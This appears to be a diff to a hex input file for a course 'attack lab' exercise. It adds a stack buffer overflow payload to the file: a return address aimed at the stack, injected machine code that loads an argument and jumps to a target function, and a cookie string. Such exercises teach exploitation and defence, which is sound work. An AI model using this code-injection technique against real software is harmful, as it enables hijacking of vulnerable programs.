@@ -23,15 +23,28 @@
 41 41 41 41 41 41 41 41
 41 41 41 41 41 41 41 41 */
 
+/* top of stack when getbuf called 0x55619db0 */
+/* replace with next address to execute injected code */
+b8 9d 61 55 00 00 00 00
+
+/* Begin injected code
+   0:	48 c7 c7 c8 9d 61 55 	mov    $0x55619dc8,%rdi
+   7:	68 c4 18 40 00       	pushq  $0x4018c4
+   c:	c3                   	retq
+*/
+48 c7 c7 c8 9d 61 55
+68 c4 18 40 00
+c3 00 00 00
+
+/* 0x1a7dd803 Cookie */
+31 61 37 64 64 38 30 33 
+
+/* Reference */
 /* 0x00000000004018c4 touch3 address */ 
 /* c4 18 40 00 00 00 00 00 */
 
 /* 0x0000000000401846 hexmatch address */
 /* 46 18 40 00 00 00 00 00 */
 
-/* 0x1a7dd803 Cookie */
-33 30 38 64 64 37 61 31
-00 /* Newline */
 
-/* test after string */
-41
+
